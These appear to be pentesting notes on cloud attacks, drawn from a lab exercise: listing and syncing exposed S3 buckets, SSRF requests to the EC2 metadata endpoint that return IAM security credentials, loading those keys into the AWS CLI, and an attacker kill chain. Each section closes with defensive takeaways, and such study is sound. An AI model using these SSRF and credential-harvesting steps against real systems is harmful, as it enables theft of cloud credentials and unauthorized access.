# Cloud

## Cloud Pentesting

[https://cloud.hacktricks.xyz/](https://cloud.hacktricks.xyz/)

[https://www.hackthebox.com/blog/intro-cloud-pentesting](https://www.hackthebox.com/blog/intro-cloud-pentesting)

There are several benefits of using the cloud:

* Data access is available at any time and from any location.
* Improved security (Cloud providers can fix the issue once and for everyone)
* Reduced cost in CAPEX vs OPEX spend, and PAYG serverless compute (elasticity)
* Scalability and flexibility, allowing businesses to be responsive
* A single pane of glass for management and monitoring
* Built-in security suites such as Azure Sentinel

Dangerous migration

* Default service accounts with excessive privileges
* Lack of visibility (leading to shadow IT)
* Lack of personnel with the necessary expertise to manage cloud applications and services ​​security
* Misconfigurations that expose sensitive data
* Misunderstanding or a lack of awareness of the relationships and access controls between provisioned cloud resources
* Misuse or a lack of policy that would have prevented misconfigurations or weak security settings
* Publicly exposed Cloud services

There are websites such as [https://buckets.grayhatwarfare.com/](https://buckets.grayhatwarfare.com/), that allow us to search AWS S3 and Azure blob resources containing publicly accessible data.

{% code overflow="wrap" fullWidth="true" %}
```bash
# Inspecting the source code, we may find a link to a cloud platform (AWS bucket for example)
# Let’s install the AWS CLI in order to interact with this resource
sudo pip install awscli --upgrade --user
# Then, to recursively list the contents of this bucket, issue the command below.
aws s3 ls s3://megabank-supportstorage --recursive
# Download files/folders locally
aws s3 sync s3://megabank-supportstorage/$FOLDER/ 
```
{% endcode %}

Takeaways:

1. Don’t enable public access for cloud storage if this is not required.
2. Don’t store confidential information on cloud storage that might be legitimately configured for public access.
3. Name cloud storage appropriately so that it is obvious what the storage is for.

## Compute Instance Metadata

{% code overflow="wrap" fullWidth="true" %}
```sh
# The Instance Metadata service is bound to the IP address 169.254.169.254, which is an internal link-local address that is not exposed or routable externally. We can interact with the service locally via a REST API. Issue the command below to return the EC2 metadata.
curl 169.254.169.254/latest/meta-data/
# This metadata can contain sensitive information such as credentials, if the administrators have attached an IAM role to the EC2 instance. 
# As the metadata is only accessible internally, SSRF vulns might be even more serious.
# Methods disccused will work if IMDSv1 is enabled and not with IMDSv2. However, IMDSv1 is still enabled by default.
http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/
# Navigating to the path /latest/meta-data/iam/info reveals that an IAM role named support has been attached to the EC2 instance.
http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/info
# Issuing the request below is successful, and we gained some keys for the IAM user!
http://megalogistic.htb/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/support
```
{% endcode %}

The AccessKeyId and SecretAccessKey are used to sign programmatic requests that we make to AWS. We also see a time-limited session token, provided by the AWS Security Token Service (AWS STS), that allows us to authenticate to cloud resources. The command _**aws configure**_ allows us to save these values to an AWS credentials file, located at \~/.aws/credentials.

{% code overflow="wrap" fullWidth="true" %}
```bash
# Next, separately issue the command below to add the session token to the credential file.
aws configure set aws_session_token "<token_value>"
# Verify current role (effectively whoami for AWS)
aws sts get-caller-identity # the user is assumed-role/USERNAME/i-...
# See privileges
 aws iam list-attached-user-policies --user-name support
```
{% endcode %}

#### Takeaways:

1. Utilize version 2 of the Instance Metadata Service (IMDSv2).
2. If you need to assign an IAM role to an EC2 instance, ensure that this only has the minimum permissions needed to perform the required tasks (in line with the principle of least privilege).
3. Be mindful that the presence of instance metadata can make vulnerabilities such as SSRF much more dangerous.

## The Cloud Infrastructure Kill Chain

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

A kill chain is useful to conceptualize and associate the steps that attackers might take in different phases of their operation.&#x20;

Recon involves enumeration and footprinting of the cloud infrastructure attack surface, as well as interacting with publicly exposed cloud services. Low hanging fruit such as S3 buckets and Azure/GCP storage buckets might yield cloud and SSH keys, passwords, confidential documents and personally identifiable information (PII). With access to keys or other credentials, we could look to infiltrate the target environment. Initial situational awareness activities will be undertaken, such as identification of other cloud resources and of the permissions and privileges associated with their current user or application.

With a foothold in the cloud infrastructure, we would then look to undertake privilege escalation activities. Privilege escalation within a specific cloud resource or the general cloud environment is useful, as it allows us to undertake additional activities, such as accessing other users’ data and cloud shell files, or capture traffic, and demonstrates the impact of our compromise. Being able to assume the role of a more privileged user also increases the likelihood of us being able to move laterally between cloud resources, accounts (AWS), projects (GCP) resource groups (Azure), or move laterally from an Azure tenant to an on-prem AD domain. In the final stage, we can demonstrate impact by the secure exfiltration of resources (assuming that this has been approved by the client).
